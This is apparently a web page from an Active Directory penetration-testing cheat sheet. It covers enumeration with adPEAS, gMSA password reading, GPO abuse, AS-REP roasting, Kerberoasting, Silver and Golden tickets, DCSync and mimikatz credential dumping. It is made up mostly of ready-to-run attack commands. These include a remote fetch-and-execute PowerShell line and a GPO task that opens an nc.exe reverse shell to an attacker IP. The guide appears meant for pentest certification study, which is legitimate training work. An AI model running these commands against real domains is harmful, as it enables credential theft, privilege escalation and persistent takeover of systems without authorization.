              <h3 id="212-scripts-adpeas">2.12 Scripts (adPEAS)</h3>
              <h4 id="2121-importing-the-module">2.12.1 Importing the Module</h4>
              <p>Download from <a
                  href="https://github.com/61106960/adPEAS?tab=readme-ov-file#important-note-about-the-bloodhound-module">https://github.com/61106960/adPEAS?tab=readme-ov-file#important-note-about-the-bloodhound-module</a>.
              </p>
              <pre><code class="language-powershell">powershell -ExecutionPolicy Bypass

# Use any of the following options
Import-Module .\adPEAS.ps1

. .\adPEAS.ps1

gc -raw .\adPEAS.ps1 | iex

IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1&#39;)
</code></pre>
              <h4 id="2122-basic-usage">2.12.2 Basic Usage</h4>
              <ul>
                <li><strong>Enumerate Current Domain</strong>: start adPEAS and enumerate the domain for the logged-on
                  user and computer.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS
</code></pre>
              <ul>
                <li><strong>Specify Domain and Output</strong>: to specify a domain and save output without ANSI color
                  codes.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Domain &#39;[domain].com&#39; -Outputfile &#39;C:\temp\adPEAS_outputfile&#39; -NoColor
</code></pre>
              <ul>
                <li><strong>Specify Domain Controller</strong>: to enumerate using a specific domain controller.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Domain &#39;[domain].com&#39; -Server &#39;dc1.[domain].com&#39;
</code></pre>
              <ul>
                <li><strong>Using PSCredential</strong>: to use a PSCredential object for enumeration.</li>
              </ul>
              <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString &#39;[password]&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;[domain]\[userName]&#39;, $SecPassword)
Invoke-adPEAS -Domain &#39;[domain].com&#39; -Cred $Cred
</code></pre>
              <ul>
                <li><strong>Force Enumeration with Username and Password</strong>: to specify username and password for
                  enumeration while ignoring DNS issues.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Domain &#39;[domain].com&#39; -Server &#39;dc1.[domain].com&#39; -Username &#39;[domain]\[userName]&#39; -Password &#39;[password]&#39; -Force
</code></pre>
              <h4 id="2123-module-specific-usage">2.12.3 Module-Specific Usage</h4>
              <ul>
                <li><strong>Basic Active Directory Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Domain
</code></pre>
              <ul>
                <li><strong>Active Directory Rights and Permissions</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Rights
</code></pre>
              <ul>
                <li><strong>Group Policy Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module GPO
</code></pre>
              <ul>
                <li><strong>Active Directory Certificate Services Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module ADCS
</code></pre>
              <ul>
                <li><strong>Credential Exposure Issues</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Creds
</code></pre>
              <ul>
                <li><strong>Delegation Issues</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Delegation
</code></pre>
              <ul>
                <li><strong>High Privileged Groups Enumeration</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Accounts
</code></pre>
              <ul>
                <li><strong>Domain Controller and Service Enumeration</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Computer
</code></pre>
              <ul>
                <li><strong>BloodHound Enumeration (DCOnly)</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Bloodhound
</code></pre>
              <ul>
                <li><strong>BloodHound Enumeration (All)</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Bloodhound -Scope All
</code></pre>
              <h3 id="213-group-managed-service-accounts-gmsas-abuse">2.13 Group Managed Service Accounts (gMSAs)
                Abuse</h3>
              <h4 id="2131-identifying-group-managed-service-accounts-gmsas">2.13.1 Identifying Group Managed Service
                Accounts (gMSAs)</h4>
              <h5 id="21311-manual-discovery-of-gmsas">2.13.1.1 Manual Discovery of gMSAs</h5>
              <p>You can manually search for gMSA accounts in Active Directory using PowerShell or LDAP queries.</p>
              <p><strong>Using PowerShell</strong>
                PowerShell&rsquo;s <code>Get-ADServiceAccount</code> cmdlet can help identify gMSA accounts, assuming
                you have sufficient permissions. This command lists all gMSAs in the domain with their properties,
                including <code>msDS-ManagedPassword</code>, if you have permissions to view it.</p>
              <pre><code class="language-powershell">Get-ADServiceAccount -Filter {ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;} -Properties *
</code></pre>
              <p><strong>Using LDAP Query</strong>
                You can also search for gMSAs directly by filtering based on their object class. This approach is useful
                if you don&rsquo;t have access to <code>Get-ADServiceAccount</code> but can execute LDAP queries. You
                can inspect the properties of each returned object for further information, like the account&#39;s
                service name.</p>
              <pre><code class="language-powershell">Get-ADObject -LDAPFilter &quot;(objectClass=msDS-GroupManagedServiceAccount)&quot; -Properties *
</code></pre>
              <p><strong>Identify Accessible gMSA Passwords</strong>: Once gMSAs are identified, check if you can read
                the <code>msDS-ManagedPassword</code> attribute. This attribute contains the encrypted password and is
                often readable by specific privileged accounts or groups.</p>
              <h5 id="21312-automated-discovery-with-bloodhound">2.13.1.2 Automated Discovery with BloodHound
              </h5>
              <p>BloodHound can map out relationships and permissions in Active Directory, making it ideal for
                identifying exploitable accounts, including gMSAs.</p>
              <ol>
                <li><strong>Run BloodHound Collection</strong>: use BloodHound&rsquo;s <code>SharpHound</code> collector
                  to gather data from the domain.</li>
              </ol>
              <pre><code class="language-powershell">SharpHound.exe -c All
</code></pre>
              <ol start="2">
                <li>
                  <p><strong>Analyze in BloodHound GUI</strong>: open the BloodHound GUI, upload the collected data, and
                    search for accounts with privileges to read gMSA passwords:</p>
                  <ul>
                    <li>Use the <strong>&quot;Find Principals with DCSync Rights&quot;</strong> query, which might help
                      indirectly as gMSA permissions are often linked to elevated roles.</li>
                    <li>Search for any objects where specific user groups have <code>ReadProperty</code> rights on the
                      <code>msDS-ManagedPassword</code> attribute.
                    </li>
                  </ul>
                </li>
                <li>
                  <p>(Optional) <strong>Query Examples in BloodHound</strong>:</p>
                  <ul>
                    <li>Use the query <code>Find Principals with Unusual Rights on Password Attributes</code>, as this
                      often includes gMSA password attributes.</li>
                    <li>BloodHound may highlight gMSA accounts that are configured with permissions for non-admin users
                      or groups, indicating potential targets for exploitation.</li>
                  </ul>
                </li>
              </ol>
              <h4 id="2132-gmsa-password-retrieval-with-gmsapasswordreader">2.13.2 GMSA Password Retrieval
                with GMSAPasswordReader</h4>
              <p><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><code>GMSAPasswordReader.exe</code></a>
                can
                be used to retrieve the plaintext password for Group Managed Service Accounts (gMSAs). This tool
                requires specific permissions, usually access to read the <code>msDS-ManagedPassword</code> attribute of
                the gMSA object.</p>
              <h5 id="21321-usage">2.13.2.1 Usage</h5>
              <ol>
                <li>
                  <p><strong>Run <code>GMSAPasswordReader.exe</code> with Proper Privileges</strong>: ensure you have
                    sufficient permissions to read gMSA password attributes in Active Directory. Typically, Domain Admin
                    or specific permissions on the gMSA object are required.</p>
                </li>
                <li>
                  <p><strong>Command Syntax</strong>: the tool can be run from the command line to retrieve gMSA
                    passwords.</p>
                </li>
              </ol>
              <pre><code class="language-powershell">.\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]

# Example
.\GMSAPasswordReader.exe --accountname &#39;svc_apache&#39;
# This will return probably an rc4_hmac (not the Old Value), which is the same as an NTLM hash, so we can try to crack it (hashcat -m 1000 &#39;[ntlm_hash]&#39; [wordlist]) or do a pass the hash, don&#39;t forget the &#39;$&#39; for the username if it is a service account (evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).
</code></pre>
              <h5 id="21322-additional-notes">2.13.2.2 Additional Notes</h5>
              <ul>
                <li><strong>Permissions</strong>: Ensure that you have necessary read permissions on the
                  <code>msDS-ManagedPassword</code> attribute.
                </li>
                <li><strong>Privileged Access</strong>: Typically, this tool is most useful on systems where you already
                  have Domain Admin or specific delegated permissions on gMSA objects.</li>
                <li><strong>Security Considerations</strong>: Use this tool carefully, as improper handling of retrieved
                  passwords can expose sensitive credentials.</li>
              </ul>
              <h4 id="2133-alternative-commands">2.13.3 Alternative Commands</h4>
              <p>If you don&rsquo;t have access to <code>GMSAPasswordReader.exe</code>, you might consider using
                PowerShell or other Active Directory enumeration techniques if you have appropriate permissions to query
                gMSA accounts and their attributes.</p>
              <ol>
                <li><strong>Using PowerShell</strong> with Active Directory Module: if you have the <strong>Active
                    Directory PowerShell module</strong> installed, you can use it to query for gMSAs and their
                  <code>msDS-ManagedPassword</code> attribute. This command lists all gMSAs and attempts to retrieve
                  their <code>msDS-ManagedPassword</code> attribute. You need permissions to read this attribute.
                </li>
              </ol>
              <pre><code class="language-powershell"># Find all gMSA accounts
Get-ADServiceAccount -Filter {ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;} -Properties msDS-ManagedPassword
</code></pre>
              <ol start="2">
                <li><strong>Using <code>Get-ADObject</code></strong> to Directly Query LDAP Attributes: if
                  <code>Get-ADServiceAccount</code> isn&rsquo;t available, <code>Get-ADObject</code> can directly query
                  Active Directory for objects with <code>msDS-ManagedPassword</code>. This command retrieves all gMSA
                  objects, showing their attributes, including the managed password (if accessible).
                </li>
              </ol>
              <pre><code class="language-powershell">Get-ADObject -Filter &#39;ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;&#39; -Properties msDS-ManagedPassword
</code></pre>
              <ol start="3">
                <li>
                  <p>Retrieving gMSA Passwords with <strong><code>Get-ADAttributeEditor</code></strong>: if you have
                    permissions and access to the Active Directory UI on a Windows machine; if you have read
                    permissions, you should be able to view or export the password attribute here.</p>
                  <ol>
                    <li>Open the <strong>Active Directory Users and Computers</strong> console.</li>
                    <li>Enable <strong>Advanced Features</strong> (under <em>View</em>).</li>
                    <li>Locate the gMSA account, right-click, and select <strong>Properties</strong>.</li>
                    <li>Navigate to the <strong>Attribute Editor</strong> tab and search for
                      <code>msDS-ManagedPassword</code>.
                    </li>
                  </ol>
                </li>
                <li>
                  <p>Using LDAP Queries with <strong><code>ldapsearch</code> (Linux)</strong>: if you&rsquo;re on a
                    Linux system with <strong>ldapsearch</strong> installed, you can use it to query Active Directory
                    for gMSA accounts. This approach requires credentials with LDAP access. This command fetches gMSA
                    objects and tries to access the <code>msDS-ManagedPassword</code> attribute.</p>
                </li>
              </ol>
              <pre><code class="language-bash">ldapsearch -x -H ldap://&lt;domain_controller&gt; -D &quot;&lt;user&gt;@&lt;domain&gt;&quot; -w &quot;&lt;password&gt;&quot; -b &quot;DC=domain,DC=com&quot; &quot;(objectClass=msDS-GroupManagedServiceAccount)&quot; msDS-ManagedPassword
</code></pre>
              <ol start="5">
                <li><strong>PowerView</strong>: if you&rsquo;re using PowerView, an enumeration tool in PowerShell
                  Empire, you can search for gMSA accounts and attempt to view password attributes; PowerView&rsquo;s
                  <code>Get-DomainGMSA</code> command can enumerate gMSA accounts and potentially view
                  <code>msDS-ManagedPassword</code> if you have the necessary permissions.
                </li>
              </ol>
              <pre><code class="language-powershell"># List gMSA accounts with PowerView
Get-DomainGMSA -Properties msDS-ManagedPassword
</code></pre>
              <h3 id="212-group-policy-object-gpo-abuse">2.12 Group Policy Object (GPO) Abuse</h3>
              <p>Group Policy Objects (GPOs) allow administrators to enforce policies and configurations across all
                domain-connected machines. By modifying a GPO with malicious commands, attackers can achieve privilege
                escalation or persistence. The effectiveness of this attack lies in the fact that when GPOs are
                updated—either manually or during regular system updates—these policies are executed on all systems
                within their scope, including those used by privileged users like administrators. This means that any
                added malicious task or script will be run with the permissions of all users in that scope, enabling an
                attacker to execute code as an administrator without direct admin rights.</p>
              <p>Guides:</p>
              <ul>
                <li><a
                    href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#group-policy-object-gpos"
                    target="_blank">Hacktricks
                    GPO Guide</a></li>
                <li><a
                    href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/"
                    target="_blank">InternalAllTheThings
                    Advanced Guide</a></li>
              </ul>
              <p>Resources:</p>
              <ul>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download PowerView.ps1</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download SharpGPOAbuse.exe</a>
                </li>
                <li><a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank">SharpGPOAbuse GitHub</a></li>
              </ul>
              <ol>
                <li><strong>Import PowerView</strong></li>
              </ol>
              <pre><code class="language-powershell">powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
</code></pre>
              <ol start="2">
                <li><strong>List All GPOs</strong>: use PowerView to list all GPOs and check if there are write
                  permissions for any.<ul>
                    <li><strong>Basic GPO Listing</strong></li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell">Get-NetGPO | select displayname
</code></pre>
              <ul>
                <li><strong>Manual Permission Check</strong>: this checks if you have any write permissions on GPOs,
                  which could allow for privilege escalation.</li>
              </ul>
              <pre><code class="language-powershell">Get-DomainObjectAcl -LDAPFilter &#39;(objectCategory=groupPolicyContainer)&#39; | ? { ($_.SecurityIdentifier -match &#39;^S-1-5-.*-[1-9]\d{3,}$&#39;) -and ($_.ActiveDirectoryRights -match &#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;)} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
</code></pre>
              <ul>
                <li><strong>BloodHound Alternative</strong>: use BloodHound to check for <code>WriteGPO</code>,
                  <code>OwnsGPO</code>, or <code>GPO control</code> privileges, as they indicate possible GPO
                  manipulation for escalation.
                </li>
              </ul>
              <ol start="3">
                <li><strong>Enumerate a Specific GPO</strong>
                  <ul>
                    <li><strong>Identify GPO by Display Name</strong></li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell">Get-GPO -Name &quot;[DisplayName]&quot;
</code></pre>
              <ul>
                <li><strong>Convert GPO ID to Name</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-GPO -Guid [gpo_id]
</code></pre>
              <ol start="4">
                <li><strong>Check Permissions on Specific GPO</strong>: verify if you have edit permissions or ownership
                  on a particular GPO.</li>
              </ol>
              <pre><code class="language-powershell">Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
</code></pre>
              <ol start="5">
                <li><strong>Execute the Attack (If Permissions Allow)</strong>: se <code>SharpGPOAbuse</code> to
                  manipulate GPOs.<ul>
                    <li><strong>Create a Reverse Shell Task</strong></li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell">./SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;test&quot; --Author &quot;[current_user]&quot; --Command &quot;cmd.exe&quot; --Arguments &quot;/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe&quot; --GPOName &quot;[GPO_to_abuse]&quot;
</code></pre>
              <ul>
                <li><strong>Add User to Administrators Group</strong></li>
              </ul>
              <pre><code class="language-powershell">.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &lt;user&gt; --GPOName &quot;[GPO_to_abuse]&quot;
</code></pre>
              <ol start="6">
                <li><strong>Force Policy Update</strong>: apply the GPO changes immediately across the domain.</li>
              </ol>
              <pre><code class="language-powershell">gpupdate /force
</code></pre>

              <h2 id="3-active-directory-attacking">3. <span class="emoji">👾</span> Active Directory Attacking</h2>
              <h3 id="31-as-rep-roasting">3.1 AS-REP Roasting</h3>
              <p>AS-REP Roasting targets accounts that do not require pre-authentication, allowing attackers to request
                an AS-REP (Authentication Service Response) message containing the encrypted password hash, which can
                then be brute-forced offline.</p>
              <p><strong>How it works</strong>:</p>
              <ul>
                <li>Attackers request an AS-REP message for accounts that do not enforce Kerberos pre-authentication.
                </li>
                <li>The AS-REP response contains an encrypted portion that uses the user&#39;s password hash as a key.
                </li>
                <li>Attackers can extract this hash and crack it offline using tools like <code>hashcat</code> or
                  <code>John the Ripper</code>.
                </li>
              </ul>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Find users without pre-authentication</strong>:</li>
              </ol>
              <pre><code class="language-powershell">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
</code></pre>
              <ol start="2">
                <li><strong>AS-REP Roasting using Rubeus</strong>:</li>
              </ol>
              <pre><code class="language-powershell">Rubeus.exe asreproast

# The /nowrap option prevents the output from being wrapped to the next line, allowing you to see the entire output on a single line without any breaks
Rubeus.exe asreproast /nowrap
</code></pre>
              <ol start="3">
                <li><strong>AS-REP Hash extraction using Impacket</strong>:</li>
              </ol>
              <pre><code class="language-bash"># From Kali (GetNPUsers.py)
impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]

# From Windows
GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
</code></pre>
              <ol start="4">
                <li><strong>Crack the AS-REP hash</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="32-kerberoasting">3.2 Kerberoasting</h3>
              <p>Kerberoasting involves attacking Service Principal Names (SPNs) that are configured in Active
                Directory. Attackers request a <strong>Kerberos Ticket-Granting Service (TGS)</strong> ticket for these
                SPNs, extract the service account hash from the ticket, and brute-force the password offline.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The attacker requests a TGS for a service account (SPN) that has a valid ticket.</li>
                <li>The service&#39;s TGS is encrypted with the service account&#39;s password hash.</li>
                <li>The attacker can extract the TGS ticket and crack it offline using tools like <code>hashcat</code>.
                </li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Enumerate Service Principal Names (SPNs)</strong>:</li>
              </ol>
              <pre><code class="language-powershell">GetUserSPNs.py domain/[user]:[password]@[dc-ip]
</code></pre>
              <ol start="2">
                <li><strong>Request a TGS ticket for SPNs</strong>:</li>
              </ol>
              <pre><code class="language-bash"># From Kali
sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
or
sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]

# From Windows
GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
</code></pre>
              <ol start="3">
                <li><strong>Extract TGS ticket from memory using Rubeus</strong>:</li>
              </ol>
              <pre><code class="language-powershell">Rubeus.exe kerberoast
or
Rubeus.exe kerberoast /outfile:[output_file].kerberoast
</code></pre>
              <ol start="4">
                <li><strong>Crack the TGS hash</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="33-silver-tickets">3.3 Silver Tickets</h3>
              <p>Silver Tickets allow attackers to forge a Ticket-Granting Service (TGS) for specific services like
                <strong>CIFS</strong> (file sharing) or <strong>HTTP</strong>, enabling access to those services without
                needing a valid TGT from a domain controller.
              </p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The attacker obtains the <strong>NTLM hash</strong> or <strong>Kerberos hash</strong> of a service
                  account.</li>
                <li>The attacker uses this hash to create a forged TGS ticket, allowing them to authenticate to specific
                  services (e.g., CIFS, HTTP).</li>
                <li>Since Silver Tickets bypass domain controllers, they are harder to detect in logs.</li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Extract NTLM hash of the service account</strong> (e.g., CIFS):</li>
              </ol>
              <pre><code class="language-powershell"># 1. Find the [ServiceAccountName]
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
or
Get-ADUser -Filter {ServicePrincipalName -like &quot;*MSSQL*&quot;} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# 2. Extract the NTLM hash
mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]

# Example:
mimikatz # lsadump::dcsync /user:HTTP/server01
</code></pre>
              <ol start="2">
                <li><strong>Create a Silver Ticket using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># 1. Find the Domain SID
(Get-ADDomain).DomainSID
or
whoami /user

# 2. Find the target server (my DC server)
Get-ADDomainController -Filter *
or
netdom query dc

# 3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 2.11)
mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]

# Example:
mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
</code></pre>
              <ol start="3">
                <li><strong>Inject the Silver Ticket into the session</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # kerberos::ptt silver_ticket.kirbi

# Confirm the existence of the ticket
klist
</code></pre>
              <ol start="4">
                <li><strong>Access the target service</strong> (e.g., CIFS):</li>
              </ol>
              <pre><code class="language-bash">dir \\targetserver\sharedfolder
</code></pre>
              <h3 id="34-golden-tickets">3.4 Golden Tickets</h3>
              <p>Golden Tickets are forged <strong>Ticket-Granting Tickets (TGT)</strong> that allow attackers to
                impersonate any user, including Domain Admins, by creating a TGT valid for the entire domain. Golden
                Tickets are one of the most powerful attacks as they grant persistent, high-level access.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The attacker dumps the <strong>KRBTGT</strong> account hash (using tools like
                  <code>Mimikatz</code>).
                </li>
                <li>Using this hash, they can create a forged TGT for any user.</li>
                <li>The forged TGT can be used to authenticate as any user across the domain, including Domain Admins.
                </li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Dump KRBTGT account hash</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
</code></pre>
              <ol start="2">
                <li><strong>Create Golden Ticket using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># 1. Find the Domain SID
(Get-ADDomain).DomainSID
or
whoami /user

# 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"

# 3. Create the Ticket
mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
or
mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
</code></pre>
              <ol start="3">
                <li><strong>Inject Golden Ticket</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # kerberos::ptt golden_ticket.kirbi

# Confirm the existence of the ticket
klist
</code></pre>
              <ol start="4">
                <li><strong>Access domain resources</strong>:</li>
              </ol>
              <pre><code class="language-bash">net use \\domaincontroller\C$ /user:[DesiredUsername]
</code></pre>
              <h3 id="35-domain-controller-synchronization-dc-sync">3.5 Domain Controller Synchronization (DC Sync)
              </h3>
              <p>The DC Sync attack involves mimicking a Domain Controller (DC) to request credentials from another DC,
                effectively obtaining password hashes (including KRBTGT, Admins) without triggering alarms.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li><strong>Permissions</strong>: The attacker needs to have the <strong>Replicating Directory
                    Changes</strong> or <strong>Replicating Directory Changes All</strong> permissions, which are often
                  granted to Domain Admins and other high-privilege accounts.</li>
                <li><strong>Replication Request</strong>: By sending a replication request, the attacker can pull user
                  account data, including password hashes, directly from a Domain Controller.</li>
                <li><strong>Credential Theft</strong>: Once the attacker obtains these hashes, they can use them for
                  further attacks (like Pass-the-Hash or Pass-the-Ticket) or crack them to obtain plaintext passwords.
                </li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Identify Domain Admins</strong>: ensure you have the required permissions.</li>
              </ol>
              <pre><code class="language-powershell">Get-ADGroupMember -Identity &quot;Domain Admins&quot;
</code></pre>
              <ol start="2">
                <li><strong>Perform DC Sync using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># From Kali
impacket-secretsdump [domain.com]/[adminUser]:&quot;[password]&quot;@[dc-ip]
# or; the -just-dc-user [targetUser] is to only extract the hashes of the indicated user and not all the DC.
impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:&quot;[password]&quot;@[dc-ip]

# From Windows
mimikatz # lsadump::dcsync /domain:[domain.com]
# or; here we just extract the specified user.
mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]</code></pre>
              <ol start="4">
                <li><strong>Extracting all accounts and hashes</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::dcsync /domain:[domain.com]
</code></pre>
              <ol start="5">
                <li><strong>Output to a file</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># You can redirect output to a file for analysis:
mimikatz # lsadump::dcsync /domain:domain.com &gt; output.txt
</code></pre>
              <ol start="6">
                <li><strong>Crack dumped hashes</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="36-cached-ad-credentials">3.6 Cached AD Credentials</h3>
              <p>Cached credentials allow users to log in to their machines even if the domain controller is
                unavailable. Attackers can extract these cached credentials from compromised systems.
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>When users log in, the <strong>NTLM hash</strong> of their password is cached locally.</li>
                <li>Attackers can use tools to extract and crack these cached hashes offline.</li>
              </ol>
              <p><strong>Steps</strong>:</p>
              <ol>
                <li><strong>Dump cached credentials using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::logonpasswords

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::ssp

mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::trust
mimikatz # lsadump::cache
</code></pre>
              <ol start="2">
                <li><strong>Crack cached credentials</strong>:</li>
              </ol>
              <pre><code class="language-bash">hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <h3 id="37-ntlm-authentication">3.7 NTLM Authentication</h3>
              <p><strong>NTLM</strong> (NT LAN Manager) is a challenge-response authentication protocol used in older
                Windows systems or when Kerberos is unavailable.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li>The client sends a <strong>NTLM negotiation</strong> message.</li>
                <li>The server sends back a <strong>challenge</strong> (random data).</li>
                <li>The client uses the challenge, combined with the user&#39;s <strong>NTLM hash</strong>, to create a
                  <strong>response</strong>.
                </li>
                <li>The server checks the response using the stored NTLM hash of the user.</li>
              </ol>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ntlm_authentication.png" class="img-fluid" alt="Descripción de la imagen">
                  <figcaption class="figure-caption text-center">NTLM Authentication Protocol</figcaption>
                </figure>
              </div>
              <p><strong>Vulnerabilities</strong>:</p>
              <ul>
                <li><strong>Pass-the-Hash</strong>: Attackers can reuse NTLM hashes without knowing the plaintext
                  password.</li>
                <li><strong>NTLM Relay</strong>: Attackers can relay NTLM authentication to another server.</li>
              </ul>
              <p><strong>Steps to do Pass-the-Hash for AD services</strong>:</p>
              <ol>
                <li><strong>Dump NTLM hash using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # sekurlsa::logonpasswords
</code></pre>
              <ol start="2">
                <li><strong>Pass the NTLM hash using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
</code></pre>
              <ol start="3">
                <li><strong>Access remote resources</strong>:</li>
              </ol>
              <pre><code class="language-bash">dir \\targetserver\sharedfolder
</code></pre>
              <h3 id="38-kerberos-authentication">3.8 Kerberos Authentication</h3>
              <p><strong>Kerberos</strong> is the default authentication protocol in modern Windows domains, offering
                mutual authentication via tickets.</p>
              <p><strong>How it works</strong>:</p>
              <ol>
                <li><strong>AS-REQ</strong>: The client requests a Ticket Granting Ticket (TGT) from the Key
                  Distribution Center (KDC) using their credentials.</li>
                <li><strong>AS-REP</strong>: The KDC responds with a TGT, encrypted with the user&#39;s password hash.
                </li>
                <li><strong>TGS-REQ</strong>: The client presents the TGT to the KDC to request access to a service.
                </li>
                <li><strong>TGS-REP</strong>: The KDC issues a <strong>Ticket Granting Service (TGS)</strong> ticket for
                  the requested service.</li>
                <li><strong>Service Authentication</strong>: The client uses the TGS to authenticate with the target
                  service.</li>
              </ol>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/kerberos_authentication.jpg" class="img-fluid" alt="Descripción de la imagen">
                  <figcaption class="figure-caption text-center">Kerberos Authentication Protocol</figcaption>
                </figure>
              </div>
              <p><strong>Vulnerabilities</strong>:</p>
              <ul>
                <li><strong>Pass-the-Ticket</strong>: Attackers can steal and reuse Kerberos tickets (TGT or TGS).</li>
                <li><strong>Kerberoasting</strong>: Attackers extract and crack service account hashes from TGS tickets.
                </li>
              </ul>
